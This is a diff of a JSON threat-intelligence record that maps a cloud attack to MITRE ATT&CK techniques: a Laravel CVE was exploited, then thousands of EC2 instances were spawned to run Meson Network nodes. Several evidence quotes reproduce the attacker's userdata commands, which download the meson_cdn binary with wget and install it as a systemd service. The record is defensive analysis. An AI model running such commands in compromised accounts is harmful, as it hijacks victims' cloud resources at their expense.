@@ -7,52 +7,9 @@
         {
           "technique_id": "T1190",
           "technique_name": "Exploit Public-Facing Application",
-          "subtechnique_id": null,
           "inferred": false,
           "evidence_quote": "The attacker exploited CVE-2021-3129 in a Laravel application and a misconfiguration in WordPress to gain initial access to the cloud account.",
           "validated": true
-        }
-      ]
-    },
-    {
-      "tactic_id": "TA0007",
-      "tactic_name": "Discovery",
-      "techniques": [
-        {
-          "technique_id": "T1526",
-          "technique_name": "Cloud Service Discovery",
-          "subtechnique_id": null,
-          "inferred": false,
-          "evidence_quote": "Following initial access, the attacker used automated reconnaissance techniques to instantly uncover a lay of the land. They then used the privileges they identified for the compromised users to create a large number of EC2 instances.",
-          "validated": true
-        }
-      ]
-    },
-    {
-      "tactic_id": "TA0004",
-      "tactic_name": "Privilege Escalation",
-      "techniques": [
-        {
-          "technique_id": "T1078.004",
-          "technique_name": "Valid Accounts: Cloud Accounts",
-          "subtechnique_id": "T1078.004",
-          "inferred": true,
-          "evidence_quote": "They then used the privileges they identified for the compromised users to create a large number of EC2 instances.",
-          "validated": true
-        }
-      ]
-    },
-    {
-      "tactic_id": "TA0003",
-      "tactic_name": "Persistence",
-      "techniques": [
-        {
-          "technique_id": "T1053.006",
-          "technique_name": "Scheduled Task/Job: Systemd Service",
-          "subtechnique_id": "T1053.006",
-          "inferred": false,
-          "evidence_quote": "sudo ./service install meson_cdn ... sudo ./service start meson_cdn",
-          "validated": false
         }
       ]
     },
@@ -63,18 +20,24 @@
         {
           "technique_id": "T1059.004",
           "technique_name": "Command and Scripting Interpreter: Unix Shell",
-          "subtechnique_id": "T1059.004",
           "inferred": false,
-          "evidence_quote": "wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn",
-          "validated": false
-        },
+          "evidence_quote": "wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn\nsudo ./meson_cdn config set --token=**** --https_port=443 --cache.size=30\nsudo ./service start meson_cdn",
+          "validated": false,
+          "subtechnique_id": "T1059.004"
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0003",
+      "tactic_name": "Persistence",
+      "techniques": [
         {
-          "technique_id": "T1204.003",
-          "technique_name": "User Execution: Malicious Image",
-          "subtechnique_id": "T1204.003",
-          "inferred": true,
-          "evidence_quote": "The attacker used a public AMI (Ubuntu 22.04) and spawned multiple batches of 500 micro-sized instances per region",
-          "validated": true
+          "technique_id": "T1053.006",
+          "technique_name": "Scheduled Task/Job: Systemd Service",
+          "inferred": false,
+          "evidence_quote": "sudo ./service install meson_cdn ... sudo ./service start meson_cdn",
+          "validated": false,
+          "subtechnique_id": "T1053.006"
         }
       ]
     },
@@ -84,10 +47,23 @@
       "techniques": [
         {
           "technique_id": "T1578.002",
-          "technique_name": "Modify Cloud Compute Infrastructure: Create Cloud Instance",
-          "subtechnique_id": "T1578.002",
+          "technique_name": "Create Cloud Instance",
           "inferred": false,
-          "evidence_quote": "Within minutes, the attacker was able to spawn almost 6,000 instances inside the compromised account across multiple regions and execute the meson_cdn binary.",
+          "evidence_quote": "\"minCount\": 500, \"account\": 500 ... Within minutes, the attacker was able to spawn almost 6,000 instances inside the compromised account across multiple regions",
+          "validated": true,
+          "subtechnique_id": "T1578.002"
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0007",
+      "tactic_name": "Discovery",
+      "techniques": [
+        {
+          "technique_id": "T1526",
+          "technique_name": "Cloud Service Discovery",
+          "inferred": false,
+          "evidence_quote": "Following initial access, the attacker used automated reconnaissance techniques to instantly uncover a lay of the land. They then used the privileges they identified for the compromised users.",
           "validated": true
         }
       ]
@@ -99,9 +75,8 @@
         {
           "technique_id": "T1496",
           "technique_name": "Resource Hijacking",
-          "subtechnique_id": null,
           "inferred": false,
-          "evidence_quote": "Within minutes, the attacker attempted to create 6,000 Meson Network nodes using a compromised cloud account... we estimate a cost of more than $2,000 per day for all the Meson network nodes created",
+          "evidence_quote": "we estimate a cost of more than $2,000 per day for all the Meson network nodes created, even just using micro sizes. This isn't counting the potential costs for public IP addresses which could run as much as $22,000 a month for 6,000 nodes!",
           "validated": true
         }
       ]
@@ -118,7 +93,8 @@
         "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
       ],
       "aws_services_involved": [],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0001"
     },
     {
       "step": 2,
@@ -133,7 +109,8 @@
         "CloudTrail",
         "IAM"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0007"
     },
     {
       "step": 3,
@@ -147,7 +124,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0005"
     },
     {
       "step": 4,
@@ -161,7 +139,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0002"
     },
     {
       "step": 5,
@@ -175,7 +154,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": false
+      "validated": false,
+      "tactic_id": "TA0003"
     },
     {
       "step": 6,
@@ -189,7 +169,8 @@
       "aws_services_involved": [
         "EC2"
       ],
-      "validated": true
+      "validated": true,
+      "tactic_id": "TA0040"
     }
   ],
   "aws_services": [
@@ -251,7 +232,7 @@
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Unix Shell",
         "description": "A malicious shell script was embedded in the EC2 userdata field. On each instance boot, it downloaded the meson_cdn binary via wget, extracted it, installed it as a systemd service, and started it \u2014 automatically enrolling each node into the attacker's Meson Network account.",
-        "tactic_id": "",
+        "tactic_id": "TA0002",
         "evidence_quote": "wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn\nsudo ./meson_cdn config set --token=**** --https_port=443 --cache.size=30\nsudo ./service start meson_cdn",
         "evidence_sources": [
           "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
@@ -265,7 +246,7 @@
         "technique_id": "T1053.006",
         "technique_name": "Scheduled Task/Job: Systemd Service",
         "description": "The meson_cdn binary was installed and started as a persistent systemd service on each EC2 instance, ensuring it survived reboots and continued contributing bandwidth and storage to the attacker's Meson Network nodes.",
-        "tactic_id": "",
+        "tactic_id": "TA0003",
         "evidence_quote": "sudo ./service install meson_cdn ... sudo ./service start meson_cdn",
         "evidence_sources": [
           "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
